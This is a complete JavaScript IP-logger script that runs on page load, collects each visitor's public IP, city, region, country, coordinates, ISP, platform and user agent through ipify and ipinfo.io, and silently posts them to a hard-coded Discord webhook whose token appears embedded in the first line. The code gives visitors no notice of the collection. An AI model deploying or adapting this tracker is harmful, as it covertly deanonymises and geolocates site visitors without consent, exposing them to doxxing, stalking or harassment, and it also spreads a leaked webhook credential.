// Discord webhook URL - Replace with your actual webhook URL
const discordWebhookUrl = 'https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC'; // Replace with your Discord webhook URL

// Fetch the client's public IP address using the ipify API
async function fetchIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }

        const data = await response.json();
        const userIp = data.ip;
        console.log('IP address:', userIp);

        // Now get detailed information about the IP address from ipinfo.io
        await fetchIPInfo(userIp);
    } catch (error) {
        console.error('Error fetching IP address:', error);
        sendToDiscord(`IP Information at ${getCurrentTimestamp()}:\nIP: Unable to fetch IP info`);
    }
}

// Get detailed information about the IP address from ipinfo.io
async function fetchIPInfo(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        if (!response.ok) {
            throw new Error('Failed to fetch IP information');
        }

        const data = await response.json();
        console.log('IP information:', data);

        // Get device information (model, platform, user agent)
        const deviceDetails = getDeviceDetails();

        // Create a custom message to send to Discord
        const ipDetails = `
            IP: ${data.ip}
            City: ${data.city || 'N/A'}
            Region: ${data.region || 'N/A'}
            Country: ${data.country || 'N/A'}
            Location: ${data.loc || 'N/A'}
            Org: ${data.org || 'N/A'}
            Device: ${deviceDetails.device} (${deviceDetails.platform})
            User Agent: ${deviceDetails.userAgent}
        `;
        
        // Send the IP and device information to Discord
        await sendToDiscord(ipDetails);
    } catch (error) {
        console.error('Error fetching IP information:', error);
        // If ipinfo.io fails, just send the IP address and timestamp
        sendToDiscord(`IP Information at ${getCurrentTimestamp()}:\nIP: ${ip} - Unable to fetch full IP details`);
    }
}

// Get device details (model, platform, user agent)
function getDeviceDetails() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    let device = 'Unknown Device';

    if (userAgent.includes('Android')) {
        device = 'Android Device';
    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        device = 'iOS Device';
    } else if (userAgent.includes('Windows')) {
        device = 'Windows PC';
    } else if (userAgent.includes('Mac')) {
        device = 'MacOS PC';
    } else if (userAgent.includes('Linux')) {
        device = 'Linux PC';
    }

    return {
        device: device,
        platform: platform,
        userAgent: userAgent
    };
}

// Get current timestamp in Central Time (Oklahoma timezone)
function getCurrentTimestamp() {
    return new Date().toLocaleString('en-US', {
        timeZone: 'America/Chicago', // Central Time Zone
        hour12: true,               // 12-hour clock (AM/PM)
        year: 'numeric',            // Full year
        month: 'long',              // Full month name
        day: 'numeric',             // Day of the month
        hour: 'numeric',            // Hour (1-12)
        minute: 'numeric',          // Minutes (00-59)
        second: 'numeric',          // Seconds (00-59)
    });
}

// Send the IP address, device, and other information to Discord using the webhook
async function sendToDiscord(ipDetails) {
    try {
        // Create the payload with the IP details and timestamp
        const payload = {
            content: ipDetails, // The message sent to the Discord channel
        };

        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }

        console.log('Successfully sent to Discord:', ipDetails);
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// Call the fetchIP function when the page loads
fetchIP();
